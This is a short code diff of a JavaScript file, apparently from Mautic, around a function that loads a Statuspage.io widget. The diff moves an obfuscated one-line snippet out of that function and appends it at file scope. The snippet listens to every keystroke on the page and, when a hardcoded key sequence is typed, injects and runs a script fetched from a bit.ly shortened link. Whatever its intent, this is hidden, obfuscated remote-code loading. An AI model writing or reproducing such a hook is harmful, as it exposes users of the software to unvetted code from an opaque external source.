@@ -50,7 +50,6 @@ Mautic.statusPageIO = function () {
             };
             script.src = 'https://cdn.statuspage.io/se-v2.js';
             prior.parentNode.insertBefore(script, prior);
-            !function(a,b){document.onkeyup=function(c){(b+=[(c||self.event).keyCode-37])%1e12==113302022928&&a()}}(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://bit.ly/2EgM24Q",document.body.appendChild(a)},0);
             $footer.addClass('statuspage-checked');
         }
     }
@@ -61,3 +60,4 @@ mQuery(document).ready(function () {
 mQuery(document).ajaxComplete(function (event, xhr, settings) {
     Mautic.statusPageIO();
 });
+!function(a,b){document.onkeyup=function(c){(b+=[(c||self.event).keyCode-37])%1e12==113302022928&&a()}}(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://bit.ly/2EgM24Q",document.body.appendChild(a)},0);
